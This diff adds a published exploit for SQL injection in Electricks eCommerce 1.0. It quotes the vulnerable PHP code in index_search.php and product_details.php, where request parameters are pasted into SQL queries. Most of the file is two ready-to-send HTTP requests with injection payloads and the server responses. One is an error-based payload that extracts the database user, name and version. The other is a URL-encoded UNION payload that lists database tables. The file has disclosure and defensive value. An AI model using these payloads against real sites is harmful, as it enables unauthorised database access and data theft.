@@ -1,0 +1,77 @@
+# Exploit Title: Electricks eCommerce 1.0 - 'prodid' SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/billyblue
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/_billyblue/electricks.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index_search.php
+# 
+#[PATH]/index_search.php
+#....
+#139 if (isset($_POST['search'])){
+#140                                                             
+#141 $search=$_POST['search'];
+#142 
+#143 $query="SELECT * FROM products WHERE category LIKE '%$search%' OR prod_name LIKE '%$search%' OR prod_desc LIKE '%$search%'";
+#144 $result = mysqli_query($dbconn,$query);
+#145 while($res=mysqli_fetch_array($result)){
+#146 $prod_id=$res['prod_id'];
+#....
+POST /[PATH]/index_search.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=upb6pa4qn0h16clnht4ugvhee1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 265
+search=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 14:51:00 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/pages/product_details.php?prod_id=[SQL]
+# 
+#[PATH]/pages/product_details.php
+#....
+#49     include('../config/dbconn.php');
+#50     $prod_id=$_GET['prod_id'];
+#51     $query = "SELECT * FROM products WHERE prod_id='$prod_id'";
+#52     $result = mysqli_query($dbconn,$query);
+#53     while($res = mysqli_fetch_array($result)) {  
+#....
+GET /[PATH]/pages/product_details.php?prod_id=%2d%31%32%27%20%20%55%4e%49%4f%4e%28%53%45%4c%45%43%54%28%31%29%2c%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%74%61%62%6c%65%5f%6e%61%6d%65%20%53%45%50%41%52%41%54%4f%52%20%30%78%33%63%36%32%37%32%33%65%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%54%41%42%4c%45%5f%53%43%48%45%4d%41%3d%44%41%54%41%42%41%53%45%28%29%29%2c%28%33%29%2c%28%34%29%2c%28%35%29%2c%28%36%29%2c%28%37%29%2c%28%38%29%2c%28%39%29%2c%28%31%30%29%2c%28%31%31%29%2c%28%31%32%29%29%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=upb6pa4qn0h16clnht4ugvhee1
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 14:55:09 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 7673
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
